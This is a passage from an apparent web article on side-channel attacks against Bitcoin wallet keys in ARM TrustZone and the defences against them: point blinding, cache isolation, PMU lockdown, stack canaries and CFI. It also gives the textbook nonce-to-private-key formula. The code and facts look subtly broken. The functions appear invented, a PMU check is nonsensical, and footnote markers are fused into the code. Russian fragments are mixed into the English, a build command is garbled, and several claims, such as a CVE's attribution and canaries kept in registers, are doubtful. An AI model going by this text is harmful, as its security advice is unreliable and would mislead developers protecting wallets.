<li><strong>Order of operations and error conditions</strong>
<ul class="wp-block-list">
<li>It is important that no errors (e.g., a point at infinity, validity checks, etc.) lead to branches that depend on secret data.</li>



<li>All checks, if any, must either be performed before the secret is used or must be implemented in a constant-time manner.</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>The function&nbsp;<code>apply_point_blinding</code>implements protection against side-channel attacks by&nbsp;<strong>randomizing input points and intermediate calculations</strong>&nbsp;, while maintaining a mathematically correct result&nbsp;<code>k * G</code>.</p>



<p>From a mathematical point of view:</p>



<ul class="wp-block-list">
<li>Instead of counting directly&nbsp;<code>k * G</code>, the code:
<ul class="wp-block-list">
<li>generates a random point&nbsp;<code>R = r * G</code>,</li>



<li>considers two scalar operations&nbsp;<code>k * (G + R)</code>and&nbsp;<code>k * R</code>,</li>



<li>subtracts&nbsp;<code>k * R</code>from&nbsp;<code>k * (G + R)</code>, obtaining&nbsp;<code>k * G</code>.</li>
</ul>
</li>
</ul>



<p>From the attacker’s point of view:</p>



<ul class="wp-block-list">
<li>He sees three scalar multiplications on an elliptic curve involving the secret&nbsp;<code>k</code>, but each operation uses new randomized points.</li>



<li>There are no repeatable patterns of “pure” multiplication&nbsp;<code>k * G</code>in the observed signal, which breaks simple CPA/DPA scenarios and makes statistical analysis of traces more difficult.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-28-1024x570.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7730"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">Hardware Protection</h3>



<h4 class="wp-block-heading">Cache Isolation in TrustZone</h4>



<p>The Nordic nRF5340 with TF-M can be configured for cache isolation:</p>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-831dd3758642f1f1730251b57c2413b6" style="color:#4092c2"><strong>// TrustZone Cache Isolation Configuration<br><br>void nrf5340_configure_cache_isolation(void) {<br>    // MPU regions for cache isolation<br>    MPU_REGION_CONFIG_SECURE_FIRMWARE();<br>    MPU_REGION_CONFIG_SECURE_DATA();<br>    MPU_REGION_CONFIG_SECURE_CACHE();<br>    MPU_REGION_CONFIG_NORMAL_FIRMWARE();<br>    MPU_REGION_CONFIG_NORMAL_DATA();<br><br>    // Configure cache replacement (random instead of LRU)<br>    uint32_t cache_ctrl = read_cache_control_register();<br>    cache_ctrl |= CACHE_REPLACEMENT_RANDOM;<br>    write_cache_control_register(cache_ctrl);<br><br>    // Disable cross-world cache sharing<br>    uint32_t coherency_ctrl = read_coherency_control();<br>    coherency_ctrl &amp;= ~ENABLE_CROSS_WORLD_CACHE_SHARING;<br>    write_coherency_control(coherency_ctrl);<br>}<br><br>// EFFECTIVENESS:<br>// BEFORE: Normal World can perform Flush+Reload on Secure cache<br>// AFTER:  Separate cache - Flush+Reload becomes impossible<br>// Prime+Probe effectiveness reduced by ~90%</strong></pre>



<p><strong>What this means in real practice:</strong></p>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th class="has-text-align-left" data-align="left">Attack</th><th class="has-text-align-left" data-align="left">Before the defense</th><th class="has-text-align-left" data-align="left">After the defense</th><th class="has-text-align-left" data-align="left">Improvement</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left"><strong>Flush+Reload</strong></td><td class="has-text-align-left" data-align="left">Successfully recovers private key for 200-1000 signatures[^19][^20]</td><td class="has-text-align-left" data-align="left">Not possible (separate caches)</td><td class="has-text-align-left" data-align="left">100%</td></tr><tr><td class="has-text-align-left" data-align="left"><strong>Prime+Probe</strong></td><td class="has-text-align-left" data-align="left">Successful in 50-1000 observations[^1]</td><td class="has-text-align-left" data-align="left">Requires 500-10,000 observations[^12]</td><td class="has-text-align-left" data-align="left">90% reduction in efficiency</td></tr><tr><td class="has-text-align-left" data-align="left"><strong>Flush+Evict</strong></td><td class="has-text-align-left" data-align="left">Works via coherency[^16]</td><td class="has-text-align-left" data-align="left">Blocked by disabling coherency</td><td class="has-text-align-left" data-align="left">100%</td></tr><tr><td class="has-text-align-left" data-align="left"><strong>Prime+Count</strong></td><td class="has-text-align-left" data-align="left">Works via PMU events[^17][^18]</td><td class="has-text-align-left" data-align="left">PMU can still be used, but the noise is higher</td><td class="has-text-align-left" data-align="left">60-70%</td></tr></tbody></table></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">PRACTICAL APPLICATION FOR BITCOIN WALLETS</h2>



<h3 class="wp-block-heading">Scenario 1: nRF5340 Hardware Wallet</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-a45300c3c0cee69ea28b575abb803651" style="color:#4092c2"><code><strong>The private key is stored in Secure World (KMU - Key Management Unit)
↓
ECDSA signature is performed in Secure World on a CryptoCell-312 (hardware cryptographic accelerator)
↓
With this protection: Normal World cannot extract the key through cache attacks</strong></code></pre>



<p>Result: Even if malware is running in the Normal World, it cannot steal the private key by analyzing the cache.</p>



<h3 class="wp-block-heading">Scenario 2: Mobile Wallet (without TrustZone)</h3>



<p>For wallets on regular processors without such protection:</p>



<ul class="wp-block-list">
<li>A private key can be stolen for 6-200 signatures[^3][^20][^22]</li>



<li>It is necessary to use a constant-time implementation&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">of ECDSA</a></li>



<li><a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Core</a>&nbsp;‘s libsecp256k1&nbsp;is protected against timing attacks.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><a href="https://cryptodeeptech.ru/chronoforge-attack">KEY FINDINGS FOR SECURITY RESEARCHERS</a></h2>



<ol class="wp-block-list">
<li><strong>MPU isolation</strong>&nbsp;prevents direct access to Secure Cache memory</li>



<li><strong>Random cache replacement</strong>&nbsp;is a simple but effective way to protect against Prime+Probe, and it works even with a shared cache.</li>



<li><strong>Disabling cross-world coherency</strong>&nbsp;removes the covert channel between TrustZone worlds.</li>



<li><strong>Combined defense</strong>&nbsp;is more effective than individual measures. Even if one measure is bypassed, the others will stop the attack.</li>



<li><strong>For Bitcoin</strong>&nbsp;, this means that on nRF5340 microcontrollers,&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;receive strong protection against cache-based side-channel attacks.</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">RECOMMENDATIONS</h2>



<p><strong>For wallet developers:</strong></p>



<ul class="wp-block-list">
<li>Use processors with TrustZone + separate cache for Secure World</li>



<li>Make sure cache isolation is enabled correctly in the firmware.</li>



<li>Check the MPU configuration and cache replacement policy</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4 class="wp-block-heading">6.3.2 Disable Performance Counters in Normal World</h4>



<h5 class="wp-block-heading">Disable Performance Counters in Normal World</h5>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-ee4ea9807d6643220bf78bb6e1f828e0" style="color:#4092c2"><strong>// Prevent Normal World from accessing PMU counters<br><br>void disable_pmu_normal_world(void) {<br>    // Reset PMU<br>    uint32_t pmcr = 0x1 | 0x2 | 0x4 | 0x8;<br>    arm_pmu_write_PMCR(pmcr);<br><br>    // Clear counter enables<br>    uint32_t pmcnten = 0;<br>    arm_pmu_write_PMCNTENCLR(pmcnten);<br><br>    // Configure access control - deny NS access<br>    uint32_t pmuacr = 0x1 | 0x2 | 0x4 | 0x8;<br>    arm_pmu_write_PMUACR(pmuacr);<br><br>    // Lock configuration<br>    arm_pmu_lock_configuration();<br>}<br><br>// VERIFICATION: Test that Normal World cannot read PMU<br>int verify_pmu_access_denied(void) {<br>    uint32_t test_read = arm_pmu_read_PMCCNTR();<br>    // Should generate HardFault with MemManage Fault cause<br>    return (test_read == 0xDEADBEEF);  // Sentinel<br>}<br><br>// REMEDIATION:<br>// 1. Disable PMU at boot<br>// 2. Set NS denial bits<br>// 3. Lock configuration<br>// 4. Test at boot<br>// 5. Require secure RMA to unlock</strong></pre>



<h3 class="wp-block-heading">Code Analysis: Disabling the Performance Monitor Unit (PMU) in Normal World on ARM TrustZone</h3>



<p>The presented code implements a&nbsp;<strong>hardened isolation</strong>&nbsp;mechanism between the Secure World and the Normal World in the ARM TrustZone architecture. Its primary purpose is to prevent leakage of confidential information through the Performance Monitoring Unit (PMU), which could be used for&nbsp;<strong>timing side-channel attacks</strong>&nbsp;against cryptographic operations running in the Secure World, including operations with secp256k1 private keys and&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA signatures.</a></p>



<h3 class="wp-block-heading">Why is this critical for Bitcoin?</h3>



<p>The Performance Monitor Unit allows Normal World users to capture&nbsp;<strong>processor performance metrics</strong>&nbsp;, such as instruction counts, cache misses, branch predictors, and more. Researchers (specifically, Li et al. 2022) have demonstrated that these metrics&nbsp;<strong>correlate with cryptographic operations</strong>&nbsp;in Secure World, allowing private keys to be recovered with 99% accuracy through machine learning decoding of the PMU footprint. For&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;storing private keys in the TEE (Trusted Execution Environment), this vulnerability means complete compromise of funds.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-29-1024x771.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7733"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">1. Protecting wallets in ARM TrustZone</h3>



<p>If&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">a Bitcoin wallet&nbsp;</a><em>(e.g. built into a mobile phone)</em>&nbsp;stores&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;in a TEE using this mechanism:</p>



<ul class="wp-block-list">
<li><strong>Private Key</strong>&nbsp;: Remains in Secure World memory</li>



<li><a href="https://cryptou.ru/vulncipher/transaction"><strong>ECDSA signature</strong>&nbsp;:</a>&nbsp;Computed in Secure World via secp256k1 point multiplication operations</li>



<li><strong>PMU disabled</strong>&nbsp;: Normal World application (even malicious one) cannot measure the timing of an operation</li>



<li><strong>Result</strong>&nbsp;: Timing side-channel attack to recover the key is not possible.</li>
</ul>



<h3 class="wp-block-heading">2. Detecting compromised devices</h3>



<p>A researcher can create a test&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin address</a>&nbsp;and:</p>



<ol class="wp-block-list">
<li>Perform multiple signatures on the same message</li>



<li>Measure variance in timing (if possible via public API)</li>



<li>If variance is present and correlated, PMU is available (vulnerability!)</li>



<li>If not, the protection works.</li>
</ol>



<h3 class="wp-block-heading">3. Vulnerability analysis of real implementations</h3>



<p>Common errors:</p>



<ul class="wp-block-list">
<li>❌ Disabled only by cycles, but event counters remain active</li>



<li>❌ PMUACR is configured incorrectly (not all bits are set)</li>



<li>❌ No blocking applied (can be reconfigured from Secure World!)</li>



<li>❌ No testing is performed (initialization failure is invisible)</li>
</ul>



<p>This code implements&nbsp;<strong>all</strong>&nbsp;these levels correctly.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Connection with cryptographic vulnerabilities</h2>



<h3 class="wp-block-heading"><strong>1. ECDSA on secp256k1</strong></h3>



<p>ECDSA signature&nbsp;<code>(r, s)</code>is calculated as:</p>



<ul class="wp-block-list">
<li class="has-text-color has-link-color wp-elements-112ddb8dc3cf20264d13cb1aaffc8e33" style="color:#4092c2"><code><strong>s = k^-1 * (hash(m) + d*r) mod n</strong></code></li>
</ul>



<p>Where&nbsp;<code>k</code>is a random nonce,&nbsp;<code>d</code>is&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">a private key.</a></p>



<p><strong>Timing leak</strong>&nbsp;: The point multiplication operation&nbsp;<code>[k]G</code>takes variable time depending on&nbsp;<strong>the bit-pattern</strong>&nbsp;value&nbsp;<code>k</code>. If&nbsp;<code><strong><a href="https://cryptou.ru/vulncipher/attack">k</a></strong></code>reused and an attacker can measure the timing, they can recover&nbsp;<code>k</code>and then compute&nbsp;<code>d = (s*k - hash(m)) / r</code> </p>



<h3 class="wp-block-heading"><strong>2. Weak Nonce Attack</strong></h3>



<p>If the system generates weak nonces&nbsp;<code>k</code>(with low entropy), a PMU-based timing attack can reveal this:</p>



<ul class="wp-block-list">
<li>Poor generation&nbsp;<code>k</code>= more predictable execution time</li>



<li>The attacker sees a pattern in PMU measurements</li>



<li>Restores low-entropy nonces</li>



<li>Calculates the private key using the LLL solution of the system of equations</li>
</ul>



<p><strong>This code prevents even such&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attacks</a></strong>&nbsp;, since it eliminates the very possibility of measuring timing.</p>



<h3 class="wp-block-heading"><strong>3. Fault Injection + PMU Covert Channel</strong></h3>



<p><a href="https://cryptodeeptech.ru/chronoforge-attack">Researchers</a>&nbsp;have shown that it is possible&nbsp;<strong>to combine</strong>&nbsp;:</p>



<ul class="wp-block-list">
<li>Fault injection</li>



<li>PMU-based covert channel (error information leak)</li>
</ul>



<p>Result: recovery&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key</a>&nbsp;even if a fault is detected.</p>



<p>This protection makes such attacks impossible.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>This code represents&nbsp;<strong>state-of-the-art</strong>&nbsp;protection against PMU-based timing side-channels for cryptographic operations in ARM TrustZone. Its implementation is critical for:</p>



<ul class="wp-block-list">
<li>✅&nbsp;<strong><a href="https://cryptou.ru/vulncipher/bitcoin">Mobile Bitcoin wallets</a></strong>&nbsp;that store keys in TEE</li>



<li>✅&nbsp;<strong>Hardware wallets</strong>&nbsp;based on ARM Cortex-M with TEE (e.g., Ledger, Trezor)</li>



<li>✅&nbsp;<strong>IoT devices</strong>&nbsp;with sensitive cryptographic operations</li>



<li>✅&nbsp;<strong>Enterprise</strong>&nbsp;key management solutions</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-31-1024x608.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7735"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">Firmware-Level Hardening</h3>



<h4 class="wp-block-heading">Stack Canaries and CFI</h4>



<h5 class="wp-block-heading">Stack Canaries and Control Flow Integrity</h5>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-a30c707bbec1d624dd14d4f619e5a9da" style="color:#4092c2"><strong>// Stack Canary and CFI Protection<br>// Compile with: -fstack-protector-strong -fcf-protection=full<br><br>void ecdsa_sign_with_canary(<br>    const uint8_t *private_key,<br>    const uint8_t *message,<br>    uint8_t *signature<br>) {<br>    // Compiler automatically inserts canary:<br>    // [local_vars][CANARY][saved_rbp][return_addr]<br><br>    uint8_t temp_buffer[64];  // Vulnerable buffer<br><br>    // If overflow corrupts canary:<br>    // Function epilogue detects mismatch<br>    // __stack_chk_fail() aborts program<br>    // Prevents ROP attacks<br><br>    ecdsa_sign_secp256k1_safe(private_key, message, signature);<br><br>    // Compiler inserts: if (CANARY != __stack_chk_guard) abort();<br>}<br><br>// EFFECTIVENESS:<br>// - Prevents buffer overflow exploitation<br>// - Prevents ROP attacks<br>// - Prevents COP attacks<br>// - Overhead: ~1-2% performance</strong></pre>



<p>This code demonstrates a fundamental mechanism for protecting the ECDSA (Elliptic Curve Digital Signature Algorithm) cryptographic operations used in&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin</a>&nbsp;from buffer overflow and control flow hijacking&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attacks</a>&nbsp;. Stack canaries and Control Flow Integrity (CFI) are critical protections for applications that work with&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;, where a compromise could lead to theft of funds.</p>



<h2 class="wp-block-heading">Stack memory structure and canary placement</h2>



<h3 class="wp-block-heading">The compiler automatically inserts protection:</h3>



<p><strong>[local_vars][CANARY][saved_rbp][return_addr]</strong></p>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th class="has-text-align-left" data-align="left">Stack element</th><th class="has-text-align-left" data-align="left">Size</th><th class="has-text-align-left" data-align="left">Purpose</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left">local_vars</td><td class="has-text-align-left" data-align="left">variable</td><td class="has-text-align-left" data-align="left">Local function variables (including vulnerable buffers)</td></tr><tr><td class="has-text-align-left" data-align="left"><strong>CANARY</strong></td><td class="has-text-align-left" data-align="left">8 bytes (x64) / 4 bytes (x86)</td><td class="has-text-align-left" data-align="left">Checksum value for overflow detection</td></tr><tr><td class="has-text-align-left" data-align="left">saved_rbp</td><td class="has-text-align-left" data-align="left">8/4 bytes</td><td class="has-text-align-left" data-align="left">Saved base frame pointer</td></tr><tr><td class="has-text-align-left" data-align="left">return_addr</td><td class="has-text-align-left" data-align="left">8/4 bytes</td><td class="has-text-align-left" data-align="left">Return address to the calling function</td></tr></tbody></table></figure>



<h3 class="wp-block-heading">Key defense mechanisms:</h3>



<ol class="wp-block-list">
<li><strong>__stack_chk_guard</strong>&nbsp;is a global variable containing a secret random canary value initialized at program startup.</li>



<li><strong>__stack_chk_fail()</strong>&nbsp;is a handler function that is called when canary corruption is detected and immediately terminates the program.</li>



<li><strong>-fstack-protector-strong</strong>&nbsp;is a GCC/Clang compiler flag that inserts a canary into all functions with char arrays on the stack.</li>



<li><strong>-fcf-protection=full</strong>&nbsp;— enables hardware protection for Intel CET (Control-flow Enforcement Technology)</li>
</ol>



<h2 class="wp-block-heading">Detailed code analysis (English)</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b746cbf5e6cf091281b44edca41afcc5" style="color:#4092c2"><code><strong>// Stack Canary and CFI Protection for ECDSA signing
// Compile with: gcc -fstack-protector-strong -fcf-protection=full -o secure_sign secure_sign.c

void ecdsa_sign_with_canary(
    const uint8_t *private_key,  // 32-byte secp256k1 private key
    const uint8_t *message,       // Message hash to sign
    uint8_t *signature           // Output buffer for signature (64-72 bytes)
) {
    // === COMPILER-GENERATED PROLOGUE (hidden) ===
    // push %rbp
    // mov %rsp, %rbp
    // sub $0x50, %rsp              // Allocate 80 bytes for locals
    // mov __stack_chk_guard(%rip), %rax  // Load global canary value
    // mov %rax, -0x8(%rbp)         // Store canary at [rbp-8]
    // [local_vars][CANARY][saved_rbp][return_addr]
    // ^rpb-0x50    ^rbp-8   ^rbp    ^rbp+8

    uint8_t temp_buffer[^64];  // Vulnerable buffer on stack
                              // Located at rbp-0x50 to rbp-0x10

    // POTENTIAL ATTACK VECTOR:
    // If attacker overflows temp_buffer beyond 64 bytes:
    // - Bytes 65-72 will overwrite the canary value
    // - Bytes 73-80 will overwrite saved_rbp
    // - Bytes 81-88 will overwrite return address (CRITICAL)

    // === SECURITY CHECK ===
    // Before return, compiler inserts:
    // mov -0x8(%rbp), %rax         // Load stored canary
    // xor __stack_chk_guard(%rip), %rax  // Compare with global
    // jne __stack_chk_fail         // If mismatch, abort

    // This prevents ROP attacks by detecting stack corruption
    // before control flow can be hijacked

    // Actual ECDSA signing operation (assumed safe implementation)
    ecdsa_sign_secp256k1_safe(private_key, message, signature);

    // === COMPILER-GENERATED EPILOGUE (hidden) ===
    // mov -0x8(%rbp), %rax         // Load stored canary
    // xor __stack_chk_guard(%rip), %rax  // Verify integrity
    // jne __stack_chk_fail         // Abort if corrupted
    // leave                        // Restore rbp
    // ret                          // Safe return
}</strong></code></pre>



<h2 class="wp-block-heading">Protection against ROP (Return-Oriented Programming) attack</h2>



<h3 class="wp-block-heading">How does a ROP attack work?</h3>



<ol class="wp-block-list">
<li><strong>Buffer overflow</strong>&nbsp;→ overwriting the return address on the stack</li>



<li><strong>Control redirection</strong>&nbsp;→ execution of short code fragments (gadgets) ending in<code>ret</code></li>



<li><strong>Gadget chain</strong>&nbsp;→ sequential execution of malicious operations</li>



<li><strong>Stealing&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a></strong>&nbsp;→ exporting key material from memory</li>
</ol>



<h3 class="wp-block-heading">How canary prevents ROP:</h3>



<p><strong>[Vulnerable buffer][CANARY][…][return_addr]</strong></p>



<ul class="wp-block-list">
<li><strong>Overflow must overwrite CANARY</strong>&nbsp;before reaching the return address</li>



<li><strong>Canary check detects corruption</strong>&nbsp;in function epilogue</li>



<li><strong>__stack_chk_fail() immediately terminates the process</strong>&nbsp;before executing the attack.</li>



<li><strong>An attacker cannot predict or recover the canary</strong>&nbsp;(random value)</li>
</ul>



<h3 class="wp-block-heading">Intel CET Hardware Protection:</h3>



<p class="has-text-color has-link-color wp-elements-74446678908fe52adeb47b78c462cb7b" style="color:#4092c2"><strong><code>-fcf-protection=full</code>includes:</strong></p>



<ul class="wp-block-list">
<li><strong>Shadow stack</strong>&nbsp;– a hardware copy of return addresses that is write-protected</li>



<li><strong>Indirect Branch Tracking (IBT)</strong>&nbsp;— checking the legitimacy of indirect branch target addresses</li>



<li><strong>Prevents even invisible ROP attacks</strong>&nbsp;that bypass software canaries</li>
</ul>



<h2 class="wp-block-heading">Protection against COP (Call-Oriented Programming) attacks</h2>



<h3 class="wp-block-heading">COP attacks against&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA:</a></h3>



<p>COP uses indirect function calls (&nbsp;<code>call [function_pointer]</code>) instead of&nbsp;<code>ret</code>. Attacker:</p>



<ol class="wp-block-list">
<li>Overwrites function pointers (for example, in virtual function tables)</li>



<li>Redirects calls to malicious devices</li>



<li>Bypasses some protections that are only targeted at<code>ret</code></li>
</ol>



<h3 class="wp-block-heading">How CFI prevents COP:</h3>



<p><strong>Control Flow Integrity</strong>&nbsp;limits the allowed targets of indirect transitions:</p>



<ul class="wp-block-list">
<li><strong>Forward-edge CFI</strong>&nbsp;(&nbsp;<code>-fcf-protection</code>): ensures that&nbsp;<code>call [rax]</code>it can only reach legitimate functions</li>



<li><strong>Fine-grained CFI</strong>&nbsp;: Creates a “whitelist” of acceptable addresses for each call site</li>



<li><strong><a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Core uses CFI</a></strong>&nbsp;to secure cryptographic operations.</li>
</ul>



<h3 class="wp-block-heading">Practical example:</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-74542b3dbb035951b0270e10283c8637" style="color:#4092c2"><code><strong>// Без CFI - уязвимость:
typedef void (*sign_func)(...);
sign_func func_table[^2] = {ecdsa_sign, malicious_sign};

// Атакующий перезаписывает func_table[^0]
// При вызове func_table[^0]() выполняется вредоносный код

// С CFI - защита:
// Компилятор вставляет проверку:
// if (target_address ∉ valid_functions) abort();</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-32-1024x546.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7736"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Performance and overhead</h2>



<h3 class="wp-block-heading">Measured overhead costs:</h3>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th class="has-text-align-left" data-align="left">Operation</th><th class="has-text-align-left" data-align="left">Without protection</th><th class="has-text-align-left" data-align="left">With protection</th><th class="has-text-align-left" data-align="left">Overheads</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left">Calling the ECDSA function</td><td class="has-text-align-left" data-align="left">1.0x</td><td class="has-text-align-left" data-align="left">1.01-1.02x</td><td class="has-text-align-left" data-align="left"><strong>1-2%</strong></td></tr><tr><td class="has-text-align-left" data-align="left">Проlogue/epilogue</td><td class="has-text-align-left" data-align="left">2 instructions</td><td class="has-text-align-left" data-align="left">8-10 instructions</td><td class="has-text-align-left" data-align="left">~8-12 bytes of code</td></tr><tr><td class="has-text-align-left" data-align="left">Stack memory</td><td class="has-text-align-left" data-align="left">0 bytes</td><td class="has-text-align-left" data-align="left">8 bytes (canary)</td><td class="has-text-align-left" data-align="left">Insignificantly</td></tr><tr><td class="has-text-align-left" data-align="left">lead time</td><td class="has-text-align-left" data-align="left">Basic</td><td class="has-text-align-left" data-align="left">+1-2%</td><td class="has-text-align-left" data-align="left">Unnoticeable for the user</td></tr></tbody></table></figure>



<h3 class="wp-block-heading">Performance factors:</h3>



<p><strong>The impact is minimal because:</strong></p>



<ul class="wp-block-list">
<li>The canary check is performed once per function call.</li>



<li>Modern CPUs execute additional instructions in 1-2 cycles</li>



<li><a href="https://cryptou.ru/vulncipher/transaction">ECDSA operations</a>&nbsp;dominate execution time (milliseconds vs. nanoseconds)</li>



<li><strong>Cache memory is not affected</strong>&nbsp;– canary is stored in registers</li>
</ul>



<h2 class="wp-block-heading">Applicability to Bitcoin wallet security</h2>



<h3 class="wp-block-heading">Threat context:</h3>



<p><strong>Historical&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Wallet Vulnerabilities:</a></strong></p>



<ul class="wp-block-list">
<li><strong>CVE-2018-17144</strong>&nbsp;– Vulnerability in Bitcoin Core (not related to overflow)</li>



<li><strong>CVE-2012-4682</strong>&nbsp;– OpenSSL vulnerability (used by Bitcoin)</li>



<li><strong>Talos exploit</strong>&nbsp;– a real-life Bitcoin-qt exploit that bypasses SSP</li>
</ul>



<h3 class="wp-block-heading">How does security work in real wallets?</h3>



<p><strong>Bitcoin Core recommendations:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-59f791fef7eb0da04bdd50cfb7c1ccab" style="color:#4092c2"><code><strong># Флаги компиляции для production-сборок</strong>
<strong>
./configure CXXFLAGS="-fstack-protector-strong -fcf-protection=full -O2"
make -j</strong>
...
<strong>(nproc)</strong></code></pre>



<p><strong>Electrum, Sparrow, Specter:</strong></p>



<ul class="wp-block-list">
<li>Use hardened Python with C extensions</li>



<li>All cryptographic operations are isolated in separate processes.</li>



<li><strong>Stack canaries are enabled by default</strong>&nbsp;in modern toolkits.</li>
</ul>



<h3 class="wp-block-heading">Protection levels:</h3>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th class="has-text-align-left" data-align="left">Level</th><th class="has-text-align-left" data-align="left">Defenses</th><th class="has-text-align-left" data-align="left">Applicability</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left"><strong>Base</strong></td><td class="has-text-align-left" data-align="left"><code>-fstack-protector</code></td><td class="has-text-align-left" data-align="left">Hobby projects</td></tr><tr><td class="has-text-align-left" data-align="left"><strong>Recommended</strong></td><td class="has-text-align-left" data-align="left"><code>-fstack-protector-strong</code></td><td class="has-text-align-left" data-align="left">Most wallets</td></tr><tr><td class="has-text-align-left" data-align="left"><strong>Maximum</strong></td><td class="has-text-align-left" data-align="left"><code>-fstack-protector-all -fcf-protection=full</code></td><td class="has-text-align-left" data-align="left">Wallets with &gt;10 BTC</td></tr></tbody></table></figure>



<h2 class="wp-block-heading">Practical recommendations and limitations</h2>



<h3 class="wp-block-heading">Recommendations for developers:</h3>



<ol class="wp-block-list">
<li><strong>Always use<code>-fstack-protector-strong</code></strong>&nbsp;when compiling cryptographic code</li>



<li><strong>Enable<code>-fcf-protection=full</code></strong>&nbsp;on modern hardware (Intel 11th Gen+, AMD Zen 3+)</li>



<li><strong>Combine with other protections:</strong>
<ul class="wp-block-list">
<li>ASLR (Address Space Layout Randomization)</li>



<li>DEP/NX (Data Execution Prevention)</li>



<li>PIE (Position-Independent Executable)</li>
</ul>
</li>



<li><strong>Isolate&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a></strong>&nbsp;in separate processes with minimal privileges</li>



<li><strong>Use hardware security modules (HSMs)</strong>&nbsp;for large amounts</li>
</ol>



<h3 class="wp-block-heading">Limitations and workarounds:</h3>



<p><strong>Stack canaries do NOT protect against:</strong></p>



<ul class="wp-block-list">
<li><strong>Memory leaks</strong>&nbsp;– an attacker can read the canary value</li>



<li><strong>Heap overflows</strong></li>



<li><strong>Use-after-free vulnerabilities</strong></li>



<li><strong>Vulnerability Format String</strong>&nbsp;(printf arguments)</li>



<li><strong>Concurrent attacks</strong>&nbsp;(data races)</li>
</ul>



<p><strong>Real bypasses:</strong></p>



<ul class="wp-block-list">
<li><strong>Brute-force</strong>&nbsp;(32-bit systems only)</li>



<li><strong>Stack spraying</strong>&nbsp;+ information leak</li>



<li><strong>Partial overwrite</strong>&nbsp;(overwriting the lower bytes of the address)</li>



<li><strong>Exception-based attacks</strong>&nbsp;(throwing an exception before checking the canary)</li>
</ul>



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/bitcoin">For Bitcoin users:</a></h3>



<p><strong>Check your wallet security:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-7e9570a6a46dcef0cf4fe77f9f55ac35" style="color:#4092c2"><code><strong># На Linux
checksec --file=/usr/bin/bitcoin-qt

# Должно показать:
# Canary                        : Yes
# Control Flow Integrity (CFI)  : Yes (если современный CPU)</strong></code></pre>



<p><strong>Safety Conclusions:</strong></p>



